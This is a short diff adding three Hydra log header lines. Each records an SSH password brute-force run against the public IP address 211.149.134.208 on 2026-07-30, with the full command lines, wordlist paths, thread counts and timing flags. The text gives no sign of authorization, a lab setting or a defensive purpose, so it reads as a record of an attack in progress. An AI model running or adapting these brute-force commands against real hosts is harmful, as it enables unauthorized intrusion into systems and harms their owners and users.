@@ -1,0 +1,3 @@
+# Hydra v9.2 run at 2026-07-30 02:57:52 on 211.149.134.208 ssh (hydra -L /tmp/ssh_users.txt -P /tmp/big_combined.txt -t 4 -o /tmp/hydra_ssh_211.149.134.208.txt -f 211.149.134.208 ssh)
+# Hydra v9.2 run at 2026-07-30 03:00:39 on 211.149.134.208 ssh (hydra -L /tmp/ssh_users.txt -P /tmp/big_combined.txt -t 2 -o /tmp/hydra_ssh_211.149.134.208.txt -f 211.149.134.208 ssh)
+# Hydra v9.2 run at 2026-07-30 03:01:59 on 211.149.134.208 ssh (hydra -L /tmp/ssh_users.txt -P /tmp/big_combined.txt -t 2 -I -W 5 -o /tmp/hydra_ssh_211.149.134.208.txt -f 211.149.134.208 ssh)
